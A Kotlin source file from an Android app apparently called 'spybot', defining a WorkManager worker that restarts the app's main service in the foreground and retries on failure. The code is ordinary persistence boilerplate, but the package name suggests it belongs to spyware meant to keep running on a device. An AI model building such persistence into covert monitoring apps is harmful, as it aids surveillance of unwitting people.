package com.spybot.app.Utils

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.spybot.app.MainService

class RestartWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        return try {
            val intent = Intent(applicationContext, MainService::class.java).apply {
                action = MainService.ACTION_START
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(applicationContext, intent)
            } else {
                applicationContext.startService(intent)
            }
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}
